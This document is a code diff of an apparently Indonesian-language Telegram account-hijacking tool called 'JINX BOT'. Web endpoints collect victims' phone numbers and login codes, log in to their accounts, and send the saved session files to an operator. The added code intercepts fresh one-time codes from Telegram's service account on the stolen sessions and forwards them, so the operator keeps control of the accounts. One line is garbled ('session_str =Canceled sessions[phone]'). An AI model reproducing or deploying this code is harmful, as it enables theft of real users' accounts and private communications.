@@ -16,9 +16,9 @@ ADMIN_ID = int(os.getenv('ADMIN_ID'))
 client = TelegramClient('jinx', API_ID, API_HASH)
 listening = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
-sessions = {}  # Simpan session di memori
+sessions = {}
 
-# === KIRIM SESSION KE BOT ===
+# === KIRIM FILE SESSION ===
 async def send_session(phone, session_str):
     file_path = f"/tmp/{phone.replace('+','')}.session"
     with open(file_path, "w") as f:
@@ -26,7 +26,7 @@ async def send_session(phone, session_str):
     await client.send_document(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")
     os.remove(file_path)
 
-# === WEB ENDPOINTS ===
+# === /start_listener ===
 @app.post("/start_listener")
 async def start_listener(req: Request):
     data = await req.json()
@@ -46,6 +46,7 @@ async def start_listener(req: Request):
     await client.send_message(ADMIN_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
     return {"success": True}
 
+# === /submit_otp ===
 @app.post("/submit_otp")
 async def submit_otp(req: Request):
     data = await req.json()
@@ -66,10 +67,7 @@ async def auto_login(phone, code, source):
         me = await temp.get_me()
         session_str = temp.session.save()
         
-        # Simpan di memori
         sessions[phone] = session_str
-        
-        # Kirim file
         await send_session(phone, session_str)
         
         await client.send_message(ADMIN_ID, f"""
@@ -83,7 +81,7 @@ Phone: `{phone}`
     except Exception as e:
         await client.send_message(ADMIN_ID, f"Gagal: {str(e)}")
 
-# === COMMAND BOT ===
+# === /list ===
 @client.on(events.NewMessage(pattern=r'/list'))
 async def list_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -95,6 +93,7 @@ async def list_cmd(event):
         msg += f"• `{p}`\n"
     await event.reply(msg, parse_mode='markdown')
 
+# === /login ===
 @client.on(events.NewMessage(pattern=r'/login (\+\d+)'))
 async def login_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -114,6 +113,7 @@ Nama: {me.first_name}
 Phone: `{phone}`
     """.strip())
 
+# === /new_otp → LANGSUNG MUNCUL KODE! ===
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     if event.sender_id != ADMIN_ID: return
@@ -122,27 +122,39 @@ async def new_otp(event):
         await event.reply("Session nggak ada!")
         return
     
-    session_str = sessions[phone]
+    session_str =Canceled sessions[phone]
     stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await stolen.connect()
     await stolen.start()
+    
     try:
-        await stolen.send_code_request(phone)
-        await event.reply(f"OTP BARU DIKIRIM KE `{phone}`")
+        sent = await stolen.send_code_request(phone)
+        msg = await event.reply(f"OTP BARU DIKIRIM KE `{phone}`\nMenunggu kode...")
+        
+        @stolen.on(events.NewMessage(incoming=True, from_users=777000))
+        async def otp_handler(e):
+            match = OTP_PATTERN.search(e.message.message)
+            if match:
+                new_code = match.group(1)
+                await client.edit_message(ADMIN_ID, msg.id, f"OTP BARU: `{new_code}`\nPhone: `{phone}`")
+                stolen.remove_event_handler(otp_handler)
+                
     except Exception as e:
         await event.reply(f"Gagal: {str(e)}")
 
+# === /help ===
 @client.on(events.NewMessage(pattern=r'/help'))
 async def help_cmd(event):
     if event.sender_id != ADMIN_ID: return
     await event.reply("""
-JINX BOT FULL CONTROL
+JINX BOT
 /list → Lihat session
-/login +6281xxx → Masuk akun
-/new_otp +6281xxx → Spam OTP
+/login +6281xxx → Masuk
+/new_otp +6281xxx → Spam OTP (kode langsung muncul!)
     """)
 
+# === STARTUP ===
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX BOT JALAN – FULL OTOMATIS!")
+    print("JINX BOT JALAN – /new_otp LANGSUNG MUNCUL!")
